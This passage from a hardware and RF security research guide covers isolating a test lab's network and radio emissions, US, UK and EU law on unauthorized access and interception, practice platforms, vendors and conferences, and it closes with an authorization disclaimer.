- Separate AP on isolated SSID for wireless tool testing (never using production WiFi)
- Network tap (Throwing Star or managed switch SPAN port) for passive traffic monitoring
- VPN gateway for out-of-band management access to lab
- Capture storage should be on isolated NAS, not internet-connected system

**pfSense/OPNsense firewall rules for lab VLAN:**
```
# Block all lab -> internet traffic
Block * * LAN:net WAN:any * *

# Allow lab -> management VLAN for logging
Pass * * LAN:net MGMT:net 514 *   # Syslog
Pass * * LAN:net MGMT:net 9000 *  # Elasticsearch
```

**Always-on monitoring stack:**
```bash
# Zeek on tap interface
zeekctl deploy
# -> /var/log/zeek/ (conn, dns, http, ssl, weird logs)

# Suricata IDS on tap interface
suricata -c /etc/suricata/suricata.yaml -i tap0 -D

# Automated daily reports
0 8 * * * /usr/local/bin/zeek_daily_report.sh
```

### 10.2 RF Isolation

**Why RF isolation matters:** RF testing devices (HackRF, Flipper, YARD Stick) can unintentionally transmit outside the test environment, potentially interfering with neighboring systems, ISM-band devices, or licensed radio services.

**Faraday enclosure options:**

| Option | Cost | Effectiveness | Notes |
|--------|------|---------------|-------|
| Commercial Faraday bag | $20-50 | Good (30-60 dB) | Portable, convenient |
| Copper mesh enclosure | $100-300 DIY | Very good (60-80 dB) | Requires conductive sealing |
| Window screen + copper tape | $30-80 | Moderate (20-40 dB) | Budget option |
| Commercial RF shielded box | $500+ | Excellent (80-100 dB) | Best for consistent testing |

**Building a DIY Faraday cage:**
```
Materials:
- Aluminum window screen (fine mesh, 0.5mm openings or smaller)
- Copper tape (adhesive, conductive)
- Aluminum foil (multiple layers)
- Conductive gasket material for door seam

Construction:
1. Build wooden frame for desired enclosure size
2. Line all surfaces with window screen
3. Seal all seams with overlapping copper tape (ensure conductive contact)
4. Create door with copper tape seam contact
5. Test: place phone inside, call it -- should not ring
6. Verify with HackRF: signal should be undetectable outside
```

**Attenuator chain for bench testing:**
```
HackRF TX --[30dB atten]--[10dB atten]-- Test Device
                                              |
                                       [10dB atten]--[30dB atten]-- HackRF RX

# Total isolation: 80 dB -- sufficient to prevent any OTA leakage
# Always use minimum TX power needed for testing
# Add SMA gender changers as needed for N<->SMA, RP-SMA<->SMA mismatches
```

**Coaxial (wired) RF testing:**
- For RFID (Proxmark3, Flipper), near-field coupling eliminates OTA transmission entirely
- For SDR testing, RF-over-coax with 20+ dB in-line attenuation protects sensitive receivers

### 10.3 Legal Framework

**United States:**

**Computer Fraud and Abuse Act (18 U.S.C. 1030):**
- Prohibits unauthorized access to computer systems
- **Authorization is the key legal boundary** — explicit written permission is required for any testing on systems you do not own
- Penalties: up to 10 years federal imprisonment for first offense, up to 20 for subsequent
- Covers computers, networks, devices — extremely broadly interpreted

**FCC Regulations:**
- **Part 15:** Unlicensed device limits. ISM band devices (WiFi, Bluetooth, 433 MHz) must comply with power limits. Intentional interference is prohibited regardless of license.
- **Part 97 (Amateur Radio Service):** Licensed amateur operators (Technician, General, or Amateur Extra class) may transmit on specified amateur bands. Required for legal transmission with HackRF/YARD Stick at power above Part 15 limits.
- **Prohibited:** Broadcasting, using intentional interference, operating without license on licensed bands.

**Electronic Communications Privacy Act (ECPA):**
- Prohibits interception of electronic communications without authorization
- Includes WiFi traffic, Bluetooth, cellular communications
- Authorization from network owner required for packet capture

**State wiretapping laws:**
- Many states have additional restrictions beyond federal law
- Some states require all-party consent for recording

**United Kingdom:**

**Computer Misuse Act 1990:**
- Section 1: Unauthorized access (up to 2 years)
- Section 2: Unauthorized access with intent (up to 5 years)
- Section 3: Unauthorized modification (up to 10 years)
- Section 3ZA: Unauthorized acts causing serious damage (up to life imprisonment)
- Authorization is the legal boundary — written permission essential

**European Union:**

**NIS2 Directive (Network and Information Security):**
- Requires robust cybersecurity measures for essential services
- Mandates vulnerability disclosure reporting
- Penalizes organizations for inadequate security controls
- Does not authorize unauthorized testing

**Authorization requirements (universal):**
- Written authorization from the system owner before any testing
- Scope definition — specific IP ranges, systems, and time windows
- Emergency stop procedure agreed in advance
- Liability clause in engagement contract
- Evidence of authorization to carry during testing

**Safe harbors:**
- Testing your own systems/networks (home lab, owned infrastructure)
- CTF competitions (authorized by organizers)
- Bug bounty programs (within defined scope)
- Authorized penetration test engagements (with written contract)

### 10.4 CTF and Practice Environments

**Purpose-built vulnerable environments** allow skill development without legal risk:

| Platform | Type | Focus |
|----------|------|-------|
| Hack The Box | Online | Linux/Windows boxes, hardware CTF |
| pwn.college | Online | Binary exploitation, systems security |
| TryHackMe | Online | Beginner-friendly, guided paths |
| OWASP WebGoat | Local | Web application vulnerabilities |
| Damn Vulnerable Router Firmware (DVRF) | Local | Embedded/router exploitation |
| VulnHub | Local VM | Downloadable vulnerable VMs |
| PentesterLab | Online | Web + network focused |

**Wireless/RF practice:**
- Hack The Box has wireless CTF challenges
- SDR challenges at various CTF events (picoCTF, DEF CON CTF)
- Build personal lab with intentionally vulnerable target devices
- Proxmark3 practice kit: buy blank T5577 and EM4100 tags for cloning practice

**Hak5 community guidelines:**
- All Hak5 tools are sold for authorized testing only
- Hak5 ToS requires users to obtain authorization before testing on others' systems
- Community forum at `community.hak5.org` for legitimate support questions

### 10.5 Procurement and Conference Calendar

**Primary vendors:**

| Vendor | Products | URL |
|--------|----------|-----|
| Hak5 | WiFi Pineapple, Rubber Ducky, Bash Bunny | hak5.org |
| Great Scott Gadgets | HackRF, Ubertooth, GreatFET | greatscottgadgets.com |
| Flipper Devices | Flipper Zero | flipperzero.one |
| Lab401 | Proxmark3, RFID research hardware | lab401.com |
| Dangerous Things | RFID/NFC implants, research supplies | dangerousthings.com |
| HakShop | Hak5 authorized reseller | hakshop.com |
| Tindie | Maker hardware marketplace | tindie.com |

**Annual security conference calendar:**

| Conference | Month | Hardware Focus |
|-----------|-------|---------------|
| DEF CON | August (Las Vegas) | Hardware Hacking Village, Badgelife contest |
| Black Hat USA | August (Las Vegas) | Arsenal hardware tools presentation |
| hardwear.io Netherlands | October | Hardware security dedicated |
| hardwear.io USA | April | Hardware security dedicated |
| CCC Congress | December (Germany) | Hardware workshops, CTF |
| CCC Camp | Summer (Germany) | Outdoor maker/hacker camping |
| TROOPERS | March (Germany) | European security |
| ReCon | June (Canada) | Reverse engineering, hardware |

---

## Additional References

- **Hak5 Documentation:** `docs.hak5.org`
- **Great Scott Gadgets Wiki:** `greatscottgadgets.com/hackrf/one/`
- **Flipper Zero Documentation:** `docs.flipper.net`
- **Proxmark3 Wiki:** `github.com/RfidResearchGroup/proxmark3/wiki`
- **Meshtastic Documentation:** `meshtastic.org/docs/`
- **GNU Radio Wiki:** `wiki.gnuradio.org`
- **RTL-SDR Blog:** `rtl-sdr.com`
- **ARRL (American Radio Relay League):** `arrl.org` — amateur radio licensing
- **FCC License Search:** `wireless.fcc.gov/uls/`
- **NVD CVE Database:** `nvd.nist.gov` — vulnerability reference
- **MITRE ATT&CK:** `attack.mitre.org` — adversarial tactic reference

---

*This document is maintained for authorized security research and educational purposes. Always obtain explicit written authorization before conducting any security testing on systems you do not own. Unauthorized use of the tools and techniques described herein may violate applicable law.*
